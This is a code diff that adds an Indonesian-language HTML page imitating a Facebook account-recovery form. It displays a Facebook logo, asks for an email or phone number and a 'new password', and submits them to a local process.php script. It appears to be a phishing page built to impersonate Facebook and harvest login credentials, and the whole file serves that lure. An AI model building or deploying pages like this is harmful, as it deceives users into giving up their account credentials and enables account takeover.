@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Pemulihan Akun Facebook</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            box-sizing: border-box;
+            animation: fadeIn 0.5s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        .container {
+            background-color: #fff;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
+            text-align: center;
+            width: 100%;
+            max-width: 550px;
+            box-sizing: border-box;
+            transition: transform 0.3s ease-in-out;
+        }
+
+        .container:hover {
+            transform: translateY(-5px);
+        }
+
+        .header {
+            margin-bottom: 30px;
+        }
+
+        .logo {
+            width: 160px;
+            margin-bottom: 15px;
+            transition: transform 0.3s ease-in-out;
+        }
+
+        .logo:hover {
+            transform: scale(1.1);
+        }
+
+        h1 {
+            color: #1877f2;
+            font-size: 28px;
+            margin-bottom: 12px;
+            text-shadow: 0 1px 1px rgba(0, 0, 0, 0.1);
+        }
+
+        p {
+            font-size: 17px;
+            color: #555;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+
+        .input-group {
+            margin-bottom: 25px;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 7px;
+            font-weight: 500;
+            color: #333;
+            transition: color 0.3s ease;
+        }
+
+        label:hover {
+            color: #1877f2;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 14px;
+            margin: 6px 0;
+            box-sizing: border-box;
+            border: 1px solid #ccc;
+            border-radius: 7px;
+            font-size: 17px;
+            transition: border-color 0.3s ease;
+        }
+
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            border-color: #1877f2;
+            outline: none;
+            box-shadow: 0 0 5px rgba(24, 119, 242, 0.3);
+        }
+
+        button {
+            background-color: #1877f2;
+            color: white;
+            padding: 16px 22px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 19px;
+            transition: background-color 0.3s ease, transform 0.3s ease;
+            width: 100%;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        button:hover {
+            background-color: #166fe5;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 8px rgba(0, 0, 0, 0.15);
+        }
+
+        a {
+            color: #1877f2;
+            text-decoration: none;
+            font-weight: 600;
+            transition: color 0.3s ease;
+        }
+
+        a:hover {
+            text-decoration: underline;
+            color: #166fe5;
+        }
+
+        .footer {
+            margin-top: 30px;
+            font-size: 15px;
+            color: #777;
+        }
+
+        /* Media query for smaller screens */
+        @media (max-width: 600px) {
+            .container {
+                padding: 30px;
+            }
+
+            .logo {
+                width: 130px;
+            }
+
+            h1 {
+                font-size: 25px;
+            }
+
+            p {
+                font-size: 16px;
+            }
+
+            input[type="text"],
+            input[type="password"] {
+                font-size: 16px;
+            }
+
+            button {
+                font-size: 17px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="facebook_logo.png" alt="Facebook Logo" class="logo">
+            <h1>Pulihkan Akun Facebook Anda</h1>
+        </div>
+        <p>Masukkan email atau nomor telepon yang terkait dengan akun Anda untuk memulai proses pemulihan.</p>
+        <form action="process.php" method="POST" id="recoveryForm">
+            <div class="input-group">
+                <label for="username">Email atau Nomor Telepon:</label>
+                <input type="text" id="username" name="username" placeholder="Email atau Nomor Telepon" required>
+            </div>
+            <div class="input-group">
+                <label for="password">Kata Sandi Baru:</label>
+                <input type="password" id="password" name="password" placeholder="Kata Sandi Baru" required>
+            </div>
+            <button type="submit">Pulihkan</button>
+        </form>
+        <div class="footer">
+            <p>Kembali ke <a href="https://www.facebook.com">Facebook</a></p>
+        </div>
+    </div>
+</body>
+</html>
